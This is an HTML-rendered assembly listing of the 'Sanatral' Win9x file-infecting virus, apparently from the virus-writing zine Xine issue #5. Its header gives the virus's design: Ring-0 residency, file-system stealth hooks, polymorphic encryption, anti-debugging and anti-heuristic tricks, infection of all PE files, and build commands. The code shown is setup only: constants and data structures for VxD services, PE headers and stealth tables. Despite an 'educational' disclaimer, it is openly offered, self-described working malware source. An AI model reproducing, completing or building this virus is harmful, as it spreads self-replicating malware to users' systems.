<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>sanatral.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                              ⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø</span><span class="sc0">
</span><span class="sc1">;                                              ≥ Xine - issue #5 - Phile 207 ≥</span><span class="sc0">
</span><span class="sc1">;                                              ¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; comment       $</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;  Vital/IKX proudly presents:</span><span class="sc0">
</span><span class="sc1">;  The</span><span class="sc0">
</span><span class="sc1">;  ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹ ‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹</span><span class="sc0">
</span><span class="sc1">;  € ‹‹‹‹€ € ‹‹‹ € € ﬂ€€ € € ‹‹‹ € €‹‹ ‹‹€ € ‹‹‹ € € ‹‹‹ € € €</span><span class="sc0">
</span><span class="sc1">;  €‹‹‹‹ € € ‹‹‹ € € €‹ﬂ € € ‹‹‹ €   € €   € ‹ ‹‹€ € ‹‹‹ € € €‹‹‹‹</span><span class="sc0">
</span><span class="sc1">;  €‹‹‹‹‹€ €‹€ €‹€ €‹€ﬂ€‹€ €‹€ €‹€   €‹€   €‹€‹‹‹€ €‹€ €‹€ €‹‹‹‹‹€</span><span class="sc0">
</span><span class="sc1">;                                          virus, v 1.0, for Win9x</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Disclaimer:</span><span class="sc0">
</span><span class="sc1">; This document was written for Xine#5, as an educational paper for</span><span class="sc0">
</span><span class="sc1">; people interrested in the study of Atrificial Life. You should not</span><span class="sc0">
</span><span class="sc1">; compile this virus unless it's your intention to test it in a</span><span class="sc0">
</span><span class="sc1">; controlled environment, and not without knowing that neither I nor</span><span class="sc0">
</span><span class="sc1">; the IKX takes any responsebilities for any loss of data, economical</span><span class="sc0">
</span><span class="sc1">; losses, or any other inconveinces caused by assembly, linking, and</span><span class="sc0">
</span><span class="sc1">; /or execution of the binary file produced. The virus is fully</span><span class="sc0">
</span><span class="sc1">; working, without any bugs that I know of. It is not designed to do</span><span class="sc0">
</span><span class="sc1">; any intentional damage to files or data exept from spreading, but</span><span class="sc0">
</span><span class="sc1">; ofcourse, I will not give any warranties, as this "article",</span><span class="sc0">
</span><span class="sc1">; "document", (or call it what you want) is intended for reading only,</span><span class="sc0">
</span><span class="sc1">; for educational purposes, Gotit? Furthermore, if you did not</span><span class="sc0">
</span><span class="sc1">; understand and accepted EVERYTHING stated above, you should</span><span class="sc0">
</span><span class="sc1">; immidiatly delete this file (if online read: leave this page).</span><span class="sc0">
</span><span class="sc1">; I (the author) does not, in any way, support the illegal spreading</span><span class="sc0">
</span><span class="sc1">; of computer viruses, while I believe it's a human right to explore</span><span class="sc0">
</span><span class="sc1">; the opportunities wich lies in Artificial Life and Intelligence.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Residency and stealth:</span><span class="sc0">
</span><span class="sc1">; Ring-0 (driver mode) by LDT callgate tech, Full stealth on IFSMgr,</span><span class="sc0">
</span><span class="sc1">; the virus hooks OPEN (modify open mode), CLOSE (infect), READ</span><span class="sc0">
</span><span class="sc1">; (stealthn file areas modified by the virus), SEEK (manipulate seek</span><span class="sc0">
</span><span class="sc1">; to point within original file size), WRITE (get FSD for file write),</span><span class="sc0">
</span><span class="sc1">; FIND (show original file size), ENUMHANDLE (return original file</span><span class="sc0">
</span><span class="sc1">; size), and FILETIME (store filetime FSD for filetime stealth), a</span><span class="sc0">
</span><span class="sc1">; total of 8 file operations.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Polymorphism:</span><span class="sc0">
</span><span class="sc1">; Virus is polymorphic by 3 layers (2 layers on main virus, 1 on</span><span class="sc0">
</span><span class="sc1">; CODE sections' 2nd decryptor and address calculations). The first</span><span class="sc0">
</span><span class="sc1">; decryptor mutates it's code and decryption algorithm (ofcourse</span><span class="sc0">
</span><span class="sc1">; according to the encryption algo.), some armouring (SEH mainly)</span><span class="sc0">
</span><span class="sc1">; is put after 1st decryption, on entrance to main decryptors, wich</span><span class="sc0">
</span><span class="sc1">; consists of a simple (variable algorithm) layer covering main</span><span class="sc0">
</span><span class="sc1">; decryptor and encrypted main body (locked by randomly between 16</span><span class="sc0">
</span><span class="sc1">; and 255 loops). Largest constant scanstring is currently 3 bytes.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Misc stuff:</span><span class="sc0">
</span><span class="sc1">; Anti-heuristic infection: EntryPoint RVA points to virus "header"</span><span class="sc0">
</span><span class="sc1">; in CODE section, polymorphic virus body is appended to the end.</span><span class="sc0">
</span><span class="sc1">; Anti-monitoring as all file access is performed using direct FSD</span><span class="sc0">
</span><span class="sc1">; access, Anti-debugging, Anti-SoftIce.. infects DLL/SCR/OCX/CPL/EXE</span><span class="sc0">
</span><span class="sc1">; / all PE files.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; tasm32  /ml /v /m3 Sanatral.asm</span><span class="sc0">
</span><span class="sc1">; tlink32 /Tpe Sanatral.obj,Sanatral.exe</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;       $</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; if 1, do only infect files marked with MZxx in MZ header</span><span class="sc0">
</span><span class="sc5">AVOIDDLL</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; 0 to infect libraries (DLL), 1 to avoid them</span><span class="sc0">

</span><span class="sc5">CallGateSelector</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc1">; ehh.. this repeated warning is mostly for myself =) I hate infecting my own stuff uncontrolled :)</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc9">ELSE</span><span class="sc0">
    </span><span class="sc9">%out</span><span class="sc0">    </span><span class="sc5">WARNING</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">THE</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc5">IS</span><span class="sc0"> </span><span class="sc5">ASSEMBLED</span><span class="sc0"> </span><span class="sc5">OUTSIDE</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc5">MODE</span><span class="sc0">!!
    </span><span class="sc9">%out</span><span class="sc0">    </span><span class="sc5">Executing</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">produced</span><span class="sc0"> </span><span class="sc3">"Sanatral.exe"</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0">
    </span><span class="sc9">%out</span><span class="sc0">    </span><span class="sc5">system</span><span class="sc0">! </span><span class="sc5">Be</span><span class="sc0"> </span><span class="sc5">very</span><span class="sc0"> </span><span class="sc5">careful</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">file..</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc1">; Vxd services</span><span class="sc0">

</span><span class="sc5">VMM_Hook_V86_Int_Chain</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010041h</span><span class="sc0">
</span><span class="sc5">VMM_Get_V86_Int_Vector</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010042h</span><span class="sc0">
</span><span class="sc5">VMM_Set_V86_Int_Vector</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010043h</span><span class="sc0">
</span><span class="sc5">VMM_Get_PM_Int_Vector</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010044h</span><span class="sc0">
</span><span class="sc5">VMM_Set_PM_Int_Vector</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010045h</span><span class="sc0">
</span><span class="sc5">IOS_SendCommand</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00100004h</span><span class="sc0">
</span><span class="sc5">VMM_Get_DDB</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010146h</span><span class="sc0">
</span><span class="sc5">IFSMGR_GetHeap</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0040000Dh</span><span class="sc0">
</span><span class="sc5">IFSMGR_RetHeap</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0040000Eh</span><span class="sc0">
</span><span class="sc5">IFSMGR_InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00400067h</span><span class="sc0">
</span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00400032h</span><span class="sc0">
</span><span class="sc5">VMM_Get_Cur_VM_Handle</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010001h</span><span class="sc0">
</span><span class="sc5">VMM_PageReserve</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0001011Dh</span><span class="sc0">
</span><span class="sc5">VMM_PageCommit</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0001011Eh</span><span class="sc0">
</span><span class="sc5">VMM_Get_System_Time</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0001003Fh</span><span class="sc0">
</span><span class="sc5">VMM_Get_Cur_VM_Handle</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010001h</span><span class="sc0">
</span><span class="sc5">SHELL_SYSMODAL_Message</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00170003h</span><span class="sc0">



</span><span class="sc5">IOR</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">IOR_next</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_func</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_status</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_flags</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_callback</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_start_addr_LOW</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_start_addr_HI</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_xfer_count</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_buffer_ptr</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_private_client</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_private_IOS</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_private_port</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_ioctl_drive</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_ioctl_function</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_ioctl_control_param</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_ioctl_buffer_ptr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_ioctl_client_params</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_ioctl_return</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_req_req_handle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_req_vol_handle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_sgd_lin_phys</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_num_sgds</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_vol_designtr</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_ios_private_1</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR_reserved_2</span><span class="sc0">      </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IOR</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">ADVAPI_MEMORY</span><span class="sc0">   </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">ddRegOpenKeyA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddRegSetValueExA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddRegCloseKey</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddRegCreateKeyA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ADVAPI_MEMORY</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">STEALTH_PE_DATA</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">sdOffsetOfLastSectionHeader</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sdOffsetOfCodeSectionHeader</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sdEntryPointRVA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sdImageSize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sdCodeSize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sdCheckSum</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sdFileTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">STEALTH_PE_DATA</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">STEALTH_TABLE</span><span class="sc0">   </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">OriginalLastSection</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OriginalCodeSection</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">PEData</span><span class="sc0">          </span><span class="sc5">STEALTH_PE_DATA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">STEALTH_TABLE</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">stealth_table_size</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">STEALTH_TABLE</span><span class="sc0">


</span><span class="sc5">PORTABLE_EXECUTABLE_HEADER</span><span class="sc0">  </span><span class="sc9">struc</span><span class="sc0">

    </span><span class="sc1">; Image File Header</span><span class="sc0">

    </span><span class="sc5">PE_Signature</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">IFH_CPUType</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">IFH_NumberOfSections</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">IFH_TimeDateStamp</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">IFH_PointerToSymbolTable</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">IFH_NumberOfSymbols</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">IFH_SizeOfOptionalHeader</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">IFH_Characteristics</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

    </span><span class="sc1">; NT Optional Header</span><span class="sc0">

    </span><span class="sc5">NTOH_Magic</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   
    </span><span class="sc5">NTOH_MajorLinkerVersion</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_MinorLinkerVersion</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_SizeOfCode</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_SizeOfInitializedData</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_SizeOfUninitializedData</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_EntryPointRVA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_BaseOfCode</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_BaseOfData</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_ImageBase</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_SectionAlignment</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_FileAlignment</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_MajorOperatingSystemVersion</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_MinorOperatingSystemVersion</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_MajorImageVersion</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_MinorImageVersion</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_MajorSubsystemVersion</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_MinorSubsystemVersion</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_Reserved1</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_SizeOfImage</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_SizeOfHeaders</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_CheckSum</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_Subsystem</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_DllCharacteristics</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_SizeOfStackReserve</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_SizeOfStackCommit</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_SizeOfHeapReserve</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_SizeOfHeapCommit</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_LoaderFlags</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">NTOH_NumberOfRvaAndSizes</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">PORTABLE_EXECUTABLE_HEADER</span><span class="sc0">  </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc5">IMAGE_FILE_SYSTEM</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc1">; System File</span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0"> </span><span class="sc1">; File is a DLL</span><span class="sc0">

</span><span class="sc5">L</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">large</span><span class="sc4">&gt;</span><span class="sc0">


</span><span class="sc5">REG_SZ</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">REG_DWORD</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">HKEY_CLASSES_ROOT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0000003Fh</span><span class="sc0">
</span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">
</span><span class="sc5">PROCESS_ALL_ACCESS</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001F0FFFh</span><span class="sc0">
</span><span class="sc5">MB_OK</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00H</span><span class="sc0">
</span><span class="sc5">MB_OKCANCEL</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">01H</span><span class="sc0">
</span><span class="sc5">MB_ABORTRETRYIGNORE</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">02H</span><span class="sc0">
</span><span class="sc5">MB_YESNOCANCEL</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">03H</span><span class="sc0">
</span><span class="sc5">MB_YESNO</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">04H</span><span class="sc0">
</span><span class="sc5">MB_RETRYCANCEL</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">05H</span><span class="sc0">
</span><span class="sc5">MB_ICONHAND</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc5">MB_ICONEXCLAMATION</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">30H</span><span class="sc0">
</span><span class="sc5">MB_ICONASTERISK</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">40H</span><span class="sc0">
</span><span class="sc5">MB_DEFBUTTON1</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00H</span><span class="sc0">
</span><span class="sc5">MB_DEFBUTTON2</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc0">
